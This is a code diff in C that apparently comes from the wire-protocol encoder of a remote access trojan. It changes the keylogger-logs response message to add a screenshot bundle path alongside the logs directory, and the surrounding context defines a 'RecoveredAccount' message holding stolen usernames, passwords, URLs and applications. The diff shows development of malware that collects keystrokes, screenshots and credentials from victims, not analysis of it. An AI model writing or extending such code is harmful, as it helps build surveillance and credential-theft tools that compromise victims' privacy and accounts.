@@ -1048,10 +1048,18 @@ unsigned int remote_proto_encode_get_directory_response(const char* remote_path,
     return pos;
 }
 
-/* GetKeyloggerLogsDirectoryResponse: field 1 LogsDirectory (string). */
-unsigned int remote_proto_encode_get_keylogger_logs_directory_response(const char* logs_directory, unsigned char* out, unsigned int out_size) {
+/* GetKeyloggerLogsDirectoryResponse: field 1 LogsDirectory, field 2 ScreenshotBundlePath (string). */
+unsigned int remote_proto_encode_get_keylogger_logs_directory_response(const char* logs_directory, const char* screenshot_bundle_path, unsigned char* out, unsigned int out_size) {
     if (!out || !logs_directory || out_size < 16) return 0;
-    return put_string(out, out_size, 1, logs_directory);
+    unsigned int pos = 0;
+    unsigned int n = put_string(out + pos, out_size - pos, 1, logs_directory);
+    if (!n) return 0;
+    pos += n;
+    if (screenshot_bundle_path && screenshot_bundle_path[0]) {
+        n = put_string(out + pos, out_size - pos, 2, screenshot_bundle_path);
+        if (n) pos += n;
+    }
+    return pos;
 }
 
 /* RecoveredAccount: field 1 Username, 2 Password, 3 Url, 4 Application. */
